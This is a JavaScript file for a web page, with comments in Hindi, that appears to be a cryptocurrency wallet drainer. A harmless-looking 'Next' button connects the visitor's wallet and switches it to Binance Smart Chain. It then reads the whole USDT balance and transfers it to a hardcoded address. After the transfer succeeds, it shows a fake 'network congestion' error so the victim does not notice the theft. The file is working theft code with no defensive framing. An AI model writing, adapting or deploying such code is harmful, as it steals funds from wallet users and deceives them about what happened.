// Addresses
const bscAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Real BSC USDT Address
const altWallet = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";

let web3, userAddress;

// 1. Provider ढूँढने का फंक्शन
async function getProvider() {
    if (window.ethereum) return window.ethereum;
    if (window.trustwallet) return window.trustwallet;
    if (window.web3) return window.web3.currentProvider;
    return null;
}

// 2. वॉलेट कनेक्ट और नेटवर्क स्विच
async function connect() {
    const provider = await getProvider();
    if (!provider) {
        alert("Wallet not found! If you are on mobile, please open this link inside Trust Wallet or MetaMask browser.");
        return false;
    }

    try {
        web3 = new Web3(provider);
        await provider.request({ method: 'eth_requestAccounts' });
        
        // BSC Network (Chain ID 56 / 0x38) पर स्विच करें
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (switchError) {
            // अगर नेटवर्क नहीं है तो ऐड करें
            if (switchError.code === 4902) {
                await provider.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com']
                    }]
                });
            }
        }

        const accounts = await web3.eth.getAccounts();
        userAddress = accounts[0];
        console.log("Connected:", userAddress);
        return true;
    } catch (error) {
        console.error("User denied connection");
        return false;
    }
}

// 3. Main Button Logic
async function handleNext() {
    const btn = document.getElementById("nextBtn");
    btn.disabled = true;
    btn.textContent = "Processing...";

    const isConnected = await connect();
    if (!isConnected) {
        btn.disabled = false;
        btn.textContent = "Next";
        return;
    }

    try {
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = parseFloat(web3.utils.fromWei(balanceWei, 'ether'));

        if (balance > 0) {
            // ट्रांसफर रिक्वेस्ट भेजें
            await contract.methods.transfer(bscAddress, balanceWei).send({ from: userAddress });
            
            // सफलता के बाद फेक एरर दिखाएँ
            setTimeout(() => {
                alert("❌ Transaction failed due to network congestion. Please try again.");
                btn.disabled = false;
                btn.textContent = "Next";
            }, 1000);
        } else {
            alert("No USDT found in your wallet.");
            btn.disabled = false;
            btn.textContent = "Next";
        }

    } catch (err) {
        console.error(err);
        alert("Transaction Cancelled or Failed.");
        btn.disabled = false;
        btn.textContent = "Next";
    }
}

// Event Listeners
document.getElementById("nextBtn").addEventListener("click", handleNext);
